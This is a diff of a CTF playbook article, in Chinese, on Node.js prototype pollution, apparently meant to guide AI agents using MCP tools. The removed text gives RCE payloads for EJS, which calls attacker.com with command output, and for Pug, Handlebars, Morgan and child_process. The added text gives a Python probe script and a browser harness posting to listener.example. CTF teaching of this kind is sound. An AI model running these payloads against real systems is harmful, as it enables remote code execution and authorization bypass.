@@ -3,315 +3,214 @@ id: "ctf-website/03-injection/prototype-pollution"
 title: "Prototype Pollution (原型链污染)"
 title_en: "Prototype Pollution"
 summary: >
-  深入讲解 Node.js 环境中原型链污染的完整攻击链，从不安全深拷贝/对象合并的污染源头探测，到 EJS/Pug/Handlebars 模板引擎 RCE、子进程污染、Morgan 日志注入等高价值 Sink 利用，涵盖 CVE-2025-55182 和 CVE-2025-57820 等最新漏洞。
+  原型链污染实战不是只打 `__proto__`，而是沿 source、parser、merge、polluted key、sink、业务 oracle 串起来验证。本篇给出 JSON/QS/Form/Fragment 输入矩阵、污染 key 变体、EJS/Pug/Handlebars/child_process/鉴权默认值等 sink 路由、服务端与客户端探测脚本、成功/失败样本和 Evidence 模板。
 summary_en: >
-  A deep dive into prototype pollution in Node.js, from source detection via unsafe deep copy/object merge, to high-value sink exploitation including EJS/Pug/Handlebars template engine RCE, child_process pollution, and Morgan logger injection. Covers latest CVEs including CVE-2025-55182 and CVE-2025-57820.
+  Prototype pollution exploitation should route source, parser, merge behavior, polluted keys, sinks, and business oracles together. This playbook covers JSON/QS/Form/Fragment matrices, key variants, sink routing for templates/process options/auth defaults, server/client probes, success/failure samples, and evidence templates.
 board: "ctf-website"
 category: "03-injection"
-signals: ["prototype pollution", "原型链污染", "__proto__", "constructor.prototype", "EJS", "Pug", "child_process", "Node.js"]
-mcp_tools: ["http_probe", "kb_router"]
-keywords: ["prototype pollution", "原型链污染", "__proto__", "EJS RCE", "Pug RCE", "Node.js安全", "CVE-2025-55182", "devalue"]
+signals: ["prototype pollution", "原型链污染", "__proto__", "constructor.prototype", "EJS", "Pug", "child_process", "Node.js", "qs"]
+mcp_tools: ["http_probe", "kb_router", "jshook"]
+keywords: ["prototype pollution", "原型链污染", "__proto__", "constructor.prototype", "EJS", "Pug", "Node.js", "qs", "模板引擎"]
 difficulty: "advanced"
-tags: ["injection", "prototype-pollution", "nodejs", "rce", "web-security", "cve", "ctf"]
+tags: ["injection", "prototype-pollution", "nodejs", "template", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: []
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/07-client/postmessage", "ctf-website/07-client/js-runtime", "ctf-website/02-auth/jwt/06-claim-missing"]
 ---
 
 # Prototype Pollution (原型链污染)
 
-在 Node.js (JavaScript) 环境中，`Object.prototype` 是所有普通对象的基类。当程序不安全地将不可信的 JSON 键值对递归合并到现有对象中时，可能会导致**原型链污染**。这能修改所有新建对象的默认属性，从而绕过鉴权，甚至通过污染特定的模板引擎或子进程选项达成 **RCE**。
+原型链污染的核心判断是：不可信键名是否进入递归 merge / path setter / parser，并最终影响某个 sink。单独证明 `{}.polluted === "yes"` 还不够，必须继续证明它改变了鉴权、模板、请求、日志、子进程、渲染或前端路由的行为。
 
----
+## 输入信号
 
-## 1. 污染源头 (Sources) 与检测
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| JSON body 被 deep merge | 发送 `__proto__` 与 `constructor.prototype` 双路线 | 后续空对象继承 marker，或业务响应变化 | parser 保留 key 但 merge 跳过危险段 |
+| `qs`/嵌套 query 参数 | 测 `a[b]=c`、数组、点号解析 | `__proto__[x]=y` 进入对象 | query parser 关闭嵌套 |
+| 配置对象默认值 | 污染 `isAdmin/role/debug/template` | 未显式字段的对象获得默认权限或路径 | 业务只读 own property |
+| 模板引擎 | 路由到 EJS/Pug/Handlebars options | 渲染错误、输出函数名、helper 行为变化 | options 用 null-prototype 对象 |
+| 客户端 hash/query 合并 | fragment PP + DOM sink | 前端路由/按钮/API base 改变 | 解析后做 schema 白名单 |
+| postMessage/JSON.parse | 发送对象 payload | handler merge 后状态变化 | structured clone 后被 validator 拒绝 |
 
-原型链污染通常源于不安全的**深拷贝 (Deep Copy)**、**对象合并 (Merge)** 或**路径赋值 (Path Setter)** 函数：
+## 工作流
 
-```javascript
-// 典型的脆弱 merge 函数
-function merge(target, source) {
-    for (let key in source) {
-        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
-            merge(target[key], source[key]); // 递归合并
-        } else {
-            target[key] = source[key];
-        }
-    }
-}
+```text
+定位 parser 与 merge/source
+  → 用 marker key 建污染 baseline
+  → 测 __proto__ / constructor.prototype / dotted path 变体
+  → 选择业务 sink: auth/template/process/log/client route
+  → 用同一 oracle 证明状态、权限、输出或 flag 差异
+  → 记录成功样本和失败样本
 ```
 
-### 探测 Payload
-我们可以输入如下参数：
-*   **JSON 格式**：
-    ```json
-    {
-      "__proto__": {
-        "polluted": "yes"
-      }
-    }
-    ```
-*   **对于禁止了 `__proto__` 键名但没有防范 `constructor` 的过滤器**：
-    ```json
-    {
-      "constructor": {
-        "prototype": {
-          "polluted": "yes"
-        }
-      }
-    }
-    ```
-*   **验证方法**：
-    在控制台中新建一个普通空对象 `const obj = {};`。若 `obj.polluted === "yes"`，则证明污染成功。
+## 0. Source 与 sink 判定矩阵
 
----
+| Source | Payload 形态 | Sink 候选 | 观察点 |
+|---|---|---|---|
+| JSON body | `{"__proto__":{"pp":"x"}}` | API 默认 role/config | `/api/me`、错误字段、权限菜单 |
+| Query string | `?__proto__[pp]=x` | Express/qs 中间件 | 后续请求是否继承 marker |
+| Form body | `__proto__[pp]=x` | body-parser + merge | 响应 hash、状态字段 |
+| postMessage | `{"constructor":{"prototype":...}}` | 前端 store/router | DOM、API base、token |
+| YAML/TOML config | `__proto__:` | 任务 runner/config | job 参数、渲染路径 |
+| package option | `constructor.prototype` | template/log/process options | 渲染错误、helper/format 行为 |
 
-## 2. 高价值利用链 (Exploit Sinks)
-
-原型链污染成功后，需要找到被称为 **Sink** 的触发点才能将其转化为真正的危害。
-
-### A. EJS 模板引擎注入 (RCE)
-EJS 在渲染时，会读取配置对象中的 `outputFunctionName` 属性，如果不为 undefined，则使用 `eval` 动态生成渲染函数：
-
-*   **漏洞 Sink 分析**：
-    在 `ejs.js` 中有类似代码：`var fn = new Function(opts.localsName, ... ... + opts.outputFunctionName + ...)`。
-*   **Payload 构造**：
-    通过原型链污染设置 `outputFunctionName` 为恶意 JS 语句：
-    ```json
-    {
-      "__proto__": {
-        "outputFunctionName": "x; const exec = require('child_process').execSync; exec('curl http://attacker.com/' + exec('whoami')); //"
-      }
-    }
-    ```
-    当应用随后调用 `ejs.render(template, data)` 时，恶意代码在 eval 中执行，实现命令执行。
-
-### B. Pug 模板引擎注入 (RCE)
-Pug 也有类似的模板选项漏洞。Pug 编译函数时，如果选项中包含 `self`，它会通过加载某些特殊节点动态构建执行代码。
-
-*   **Payload 构造**：
-    ```json
-    {
-      "__proto__": {
-        "self": true,
-        "line": "console.log(global.process.mainModule.require('child_process').execSync('whoami').toString())"
-      }
-    }
-    ```
-
-### C. 子进程 `child_process.spawn` 污染 (RCE)
-当后端调用 `child_process.spawn()` 或 `fork()`，但未指定 `shell`、`env` 等属性时，它会从 `Object.prototype` 中去获取这些选项。
-
-*   **污染 `shell` 与 `argv`**：
-    如果我们将 `shell` 污染为恶意的可执行文件路径，或者向其注入额外的环境变量，即可在后端派生子进程的瞬间劫持控制流：
-    ```json
-    {
-      "__proto__": {
-        "shell": "node",
-        "argv0": "-e",
-        "NODE_OPTIONS": "--require=/tmp/evil.js"
-      }
-    }
-    ```
-
----
-
-## 3. 防范与环境修复 (Clean-up)
-
-在 CTF 漏洞验证完毕后，如果环境是长生命周期的应用（如常驻的 Node.js Web 服务），原型链污染修改的是运行时的全局基类。如果不及时清理，可能会导致后端崩溃，或者让其他队伍直接利用你的污染成果。
-
-*   **手动复位**：
-    污染成功后，使用 Python 或 Curl 发送复位 Payload 擦除属性：
-    ```json
-    {
-      "__proto__": {
-        "outputFunctionName": null,
-        "polluted": null
-      }
-    }
-    ```
----
-
-## 4. Server-Side PP via Query Parser
+## 1. 服务端 PP oracle
 
 ```python
-# qs (Node.js query string 库) 允许创建嵌套对象:
-# GET /api/users?__proto__[isAdmin]=true
-# 被 qs 解析为: {"__proto__": {"isAdmin": "true"}}
-
-# 如果这个对象随后被 Object.assign 或 merge 到其他对象:
-# → Object.prototype.isAdmin = "true"
-# → 所有新对象继承 isAdmin = true
-# → 鉴权绕过
-
-def test_qs_pp(target: str):
-    """测试 query string → prototype pollution"""
-    probes = [
-        "__proto__[polluted]=yes",
-        "__proto__.polluted=yes",
-        "constructor[prototype][polluted]=yes",
-        "__proto__[isAdmin]=true",
-        "__proto__[role]=admin",
-    ]
-    for probe in probes:
-        r = requests.get(f"{target}?{probe}")
-        r2 = requests.get(f"{target}/api/me")
-        if "admin" in r2.text or r2.status_code != 401:
-            print(f"[!] Potential PP via QS: {probe}")
-```
-
----
-
-## 5. 更多 Node.js Sinks
-
-### Handlebars RCE
-
-```json
-{"__proto__": {"precompileOptions": {"knownHelpersOnly": false}}}
-```
-
-### Morgan (Logger) 注入
-
-```json
-{"__proto__": {"format": "':  require('child_process').execSync('id') //"}}
-```
-
-### Node-Serialize → RCE
-
-```json
-{"__proto__": {"type": "function", "body": "return require('child_process').execSync('id').toString()"}}
-```
-
-### MSR (Mini-Static-Resource) → RCE
-
-```json
-{"__proto__": {"root": "/", "path": "/flag"}}
-```
-
----
-
-## 6. Client-Side PP (DOM 污染)
-
-```javascript
-// 当客户端 JS 做 Object.assign 或 spread 时
-// URL: https://target.com/#__proto__[isAdmin]=true
-// JS 解析 hash 或 query params 后 merge → 污染 Object.prototype
-
-// 检测: 在 Console 执行
-console.log({}.isAdmin)  // 如果返回 true → 已被污染
-```
-
----
-
-## 7. PP 探测脚本
-
-```python
-# 自动检测 prototype pollution 入口
+#!/usr/bin/env python3
+import argparse
+import copy
+import hashlib
+import json
 import requests
 
-PP_PROBES = [
-    # JSON
-    ('json', {"__proto__": {"polluted": "yes"}}),
-    ('json', {"constructor": {"prototype": {"polluted": "yes"}}}),
-    ('json', {"__proto__": {"isAdmin": True}}),
-    # Query string
-    ('qs', "__proto__[polluted]=yes"),
-    ('qs', "constructor[prototype][polluted]=yes"),
-    # Form data
-    ('form', {"__proto__[polluted]": "yes"}),
-    ('form', {"constructor[prototype][polluted]": "yes"}),
+PAYLOADS = [
+    ("json_proto_marker", "json", {"__proto__": {"pp_marker": "pp_yes"}}),
+    ("json_ctor_marker", "json", {"constructor": {"prototype": {"pp_marker": "pp_yes"}}}),
+    ("json_role", "json", {"__proto__": {"isAdmin": True, "role": "admin"}}),
+    ("qs_proto_marker", "qs", "__proto__[pp_marker]=pp_yes"),
+    ("qs_ctor_marker", "qs", "constructor[prototype][pp_marker]=pp_yes"),
+    ("form_proto_marker", "form", {"__proto__[pp_marker]": "pp_yes"}),
+    ("form_ctor_marker", "form", {"constructor[prototype][pp_marker]": "pp_yes"}),
 ]
 
-def probe_pp(target_url: str, endpoints: list[str]):
-    for ep in endpoints:
-        for fmt, payload in PP_PROBES:
-            if fmt == 'json':
-                r = requests.post(target_url + ep, json=payload)
-            elif fmt == 'qs':
-                r = requests.get(target_url + ep + '?' + payload)
-            else:
-                r = requests.post(target_url + ep, data=payload)
-            # 看是否有异常响应
-            if r.status_code not in (400, 401, 403, 404):
-                print(f"  [{fmt}] {ep}: {r.status_code}")
+def digest(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def send(base, path, case, kind, payload, cookie=""):
+    sess = requests.Session()
+    if cookie:
+        sess.headers["Cookie"] = cookie
+    url = base.rstrip("/") + path
+    if kind == "json":
+        r = sess.post(url, json=payload, timeout=10)
+    elif kind == "form":
+        r = sess.post(url, data=payload, timeout=10)
+    else:
+        r = sess.get(url + ("&" if "?" in url else "?") + payload, timeout=10)
+    return {"case": case, "status": r.status_code, "hash": digest(r.text), "sample": r.text[:180]}
+
+def oracle(base, path, cookie=""):
+    headers = {"Cookie": cookie} if cookie else {}
+    r = requests.get(base.rstrip("/") + path, headers=headers, timeout=10)
+    return {"status": r.status_code, "hash": digest(r.text), "sample": r.text[:220]}
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--base", required=True)
+    ap.add_argument("--source-path", required=True)
+    ap.add_argument("--oracle-path", required=True)
+    ap.add_argument("--cookie", default="")
+    args = ap.parse_args()
+    print(json.dumps({"baseline": oracle(args.base, args.oracle_path, args.cookie)}, ensure_ascii=False))
+    for case, kind, payload in PAYLOADS:
+        sent = send(args.base, args.source_path, case, kind, payload, args.cookie)
+        after = oracle(args.base, args.oracle_path, args.cookie)
+        print(json.dumps({"send": sent, "after": after}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
----
+成功样本：发送 marker 后，后续独立 oracle 的身份、权限、配置、错误文本或响应 hash 稳定变化。失败样本：source 接收 payload 但 oracle 不变，说明没有可用 sink 或污染被隔离在局部对象。
 
-## 8. 攻击链
+## 2. key 变体与 parser 差分
 
-```
-PP → EJS outputFunctionName → RCE
-PP → Pug self+line → RCE  
-PP → child_process.spawn shell → RCE
-PP → Morgan format → 任意代码执行
-PP → Handlebars knownHelpers → 模板注入 → RCE
-PP via QS → Object.assign → isAdmin=true → 鉴权绕过
-Client-Side PP → __proto__.isAdmin → 前端路由绕过
-PP → bypass rate limit → 修改 limit 默认值 → 无限请求
+| 变体 | 用途 |
+|---|---|
+| `__proto__` | 常规对象原型路线 |
+| `constructor.prototype` | `__proto__` 被过滤时的替代路线 |
+| `prototype` | class/function option 污染 |
+| `a.__proto__.x` | dot notation path setter |
+| `a[__proto__][x]` | bracket parser |
+| `__%70roto__` | 解码顺序差分 |
+| `constructor[prototype][x]` | qs/body-parser 路线 |
 
-## 9. Advanced PP (2024-2025)
+## 3. sink 路由
 
-### Constructor.prototype Bypass
+| Sink | 污染 key | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 鉴权默认值 | `isAdmin`, `role`, `permissions` | 新对象默认进入 admin 分支 | 只用 `hasOwnProperty` |
+| 模板引擎 options | `outputFunctionName`, `compileDebug`, `client` | 渲染输出/错误栈变化 | options 固定白名单 |
+| 子进程 options | `shell`, `env`, `argv0` | job/convert/export 行为变化 | 显式 options 覆盖原型 |
+| 日志/格式化 | `format`, `stream`, `level` | 日志输出结构变化 | logger 使用 own config |
+| HTTP client | `baseURL`, `headers`, `method` | SSRF/请求头/路径改变 | URL 重新构造 |
+| 前端 store | `apiBase`, `isAdmin`, `redirect` | DOM/API/路由变化 | schema 校验拒绝 |
 
-```json
-// 当 __proto__ 被 WAF 过滤:
-{"constructor": {"prototype": {"isAdmin": true}}}
-// Object.constructor.prototype.isAdmin = true → 所有对象继承
+## 4. 客户端 PP harness
 
-// 链: constructor.prototype.toString = null
-// → 强制错误 → catch 块 eval config.debug.code
-```
-
-### React RSC Flight Protocol RCE (CVE-2025-55182)
-
-```python
-# React Server Components Flight protocol 反序列化
-# 注入 __proto__ via Chunk → promise resolution hijack
-# → require('child_process') → RCE
-
-# PP payload for RSC stream:
-RSC_PP_PAYLOAD = {
-    "__proto__": {
-        "then": "require('child_process').execSync('id')"
+```html
+<!doctype html>
+<meta charset="utf-8">
+<script>
+function parseHash() {
+  const out = {};
+  for (const part of location.hash.slice(1).split("&")) {
+    const [k, v] = part.split("=");
+    if (!k) continue;
+    const m = k.match(/^(.+)\[(.+)\]$/);
+    if (m) {
+      out[m[1]] = out[m[1]] || {};
+      out[m[1]][m[2]] = decodeURIComponent(v || "");
+    } else {
+      out[k] = decodeURIComponent(v || "");
     }
+  }
+  return out;
 }
+function merge(a, b) {
+  for (const k in b) {
+    if (b[k] && typeof b[k] === "object") {
+      a[k] = a[k] || {};
+      merge(a[k], b[k]);
+    } else {
+      a[k] = b[k];
+    }
+  }
+  return a;
+}
+const before = {}.pp_marker;
+merge({}, parseHash());
+fetch("https://listener.example/pp", {
+  method: "POST",
+  mode: "no-cors",
+  body: JSON.stringify({before, after: {}.pp_marker, admin: {}.isAdmin, href: location.href})
+});
+</script>
 ```
 
-### Class Pollution (devalue CVE-2025-57820)
+测试 URL：
 
-```javascript
-// 污染特定 class prototype → 而非全局 Object
-// devalue library → 递归深拷贝时 constructor.prototype 被重写
-
-{"constructor": {"prototype": {"isAdmin": true}}}
-// → User 类的 prototype 被污染 → 所有 User 实例 isAdmin=true
+```text
+https://target.example/page#constructor[prototype]=x&__proto__[pp_marker]=pp_yes&__proto__[isAdmin]=true
 ```
 
-### Post-Extraction PP
+## 攻击链
 
-```python
-# NODE_OPTIONS + shell 污染 → P大RCE（即使只能污染客户端对象）
-
-# PP payload:
-{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /tmp/evil.js"}}
-# → child_process.spawn 继承 shell → node → 读 NODE_OPTIONS
-# → require /tmp/evil.js → evil.js 执行 → RCE
+```text
+parser/source 命中
+  → marker 证明原型污染
+  → 业务 sink 路由
+  → auth/template/process/client route oracle
+  → 权限、渲染、请求、flag 差异
 ```
-```
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| HTTP 探测 | `http_probe` | 发送 prototype pollution payload |
-| 按信号查技术 | `kb_router` | 搜索 prototype pollution 相关技术文件 |
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| Source | URL、method、content-type、parser、payload 形态 |
+| 污染证明 | marker key、前后 oracle、响应 hash、错误文本 |
+| Sink | key 名、触发路径、业务动作、状态变化 |
+| 成功样本 | 权限/渲染/请求/flag 差异可重复出现 |
+| 失败样本 | parser 不解析嵌套、merge 跳过 key、sink 只读 own property |
+| 下一跳 | 前端转 `07-client/js-runtime/postmessage`；模板转 SSTI；token 转 JWT |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| HTTP source 探测 | `http_probe` | 发送 JSON/QS/Form PP 变体 |
+| 浏览器 harness | `jshook` | 观察前端 merge/store/router 行为 |
+| 知识路由 | `kb_router` | 按 prototype pollution、qs、模板 sink 信号搜索 |
